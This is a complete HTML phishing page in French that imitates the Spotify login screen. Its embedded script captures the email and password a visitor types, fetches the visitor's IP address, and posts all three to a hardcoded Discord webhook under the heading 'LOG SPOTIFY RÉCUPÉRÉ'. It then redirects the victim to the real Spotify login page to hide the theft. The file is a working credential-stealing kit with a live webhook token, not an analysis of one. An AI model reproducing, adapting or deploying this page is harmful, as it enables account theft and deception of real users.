<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connexion - Spotify</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        body { background-color: #000; color: white; font-family: sans-serif; }
        .spotify-input { background-color: #121212; border: 1px solid #727272; color: white; }
        .spotify-input:focus { border: 1px solid #1DB954; outline: none; }
        .btn-green { background-color: #1DB954; color: black; font-weight: bold; border-radius: 500px; }
        .btn-green:hover { background-color: #1ed760; transform: scale(1.02); }
    </style>
</head>
<body class="flex flex-col items-center justify-center min-h-screen p-4">
    <img src="https://storage.googleapis.com/pr-newsroom-wp/1/2018/11/Spotify_Logo_RGB_White.png" alt="Spotify" class="w-32 mb-10">
    
    <div class="w-full max-w-sm bg-[#121212] p-8 rounded-lg shadow-2xl">
        <h1 class="text-2xl font-bold mb-6 text-center">Se connecter pour continuer</h1>
        
        <div class="space-y-4">
            <input id="email" type="text" placeholder="E-mail ou nom d'utilisateur" class="w-full p-3 spotify-input rounded">
            <input id="password" type="password" placeholder="Mot de passe" class="w-full p-3 spotify-input rounded">
            <button onclick="sendData()" class="w-full p-3 btn-green transition-all mt-4">SE CONNECTER</button>
        </div>
        
        <p class="mt-8 text-center text-sm text-gray-400 underline cursor-pointer">Mot de passe oublié ?</p>
        <hr class="border-gray-800 my-6">
        <p class="text-center text-sm text-gray-400">Tu n'as pas de compte ? <span class="text-white font-bold underline cursor-pointer">S'INSCRIRE</span></p>
    </div>

    <script>
        async function sendData() {
            const email = document.getElementById('email').value;
            const pass = document.getElementById('password').value;
            const webhook = "https://discord.com/api/webhooks/1481101174131392554/JO8MZpYjagqXqSFcnyp4ZCyOnUKe-vVdsyNeg7e7IJCVwdIgzlmeWxH65dQzr7hUXxke";

            if (!email || !pass) return;

            try {
                // Récupération de l'IP
                const ipRes = await fetch('https://api.ipify.org?format=json');
                const ipData = await ipRes.json();

                const payload = {
                    embeds: [{
                        title: "🔓 LOG SPOTIFY RÉCUPÉRÉ",
                        color: 1947988,
                        fields: [
                            { name: "📧 Email", value: `\`${email}\``, inline: false },
                            { name: "🔑 Mot de passe", inline: false, value: `\`${pass}\`` },
                            { name: "🌐 IP", value: `\`${ipData.ip}\``, inline: true }
                        ],
                        footer: { text: "System Login Bypass" },
                        timestamp: new Date()
                    }]
                };

                await fetch(webhook, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(payload)
                });

                // Redirection bidon vers le vrai Spotify
                window.location.href = "https://www.spotify.com/fr/login/";
            } catch (e) {
                window.location.href = "https://www.spotify.com/fr/login/";
            }
        }
    </script>
</body>
</html>
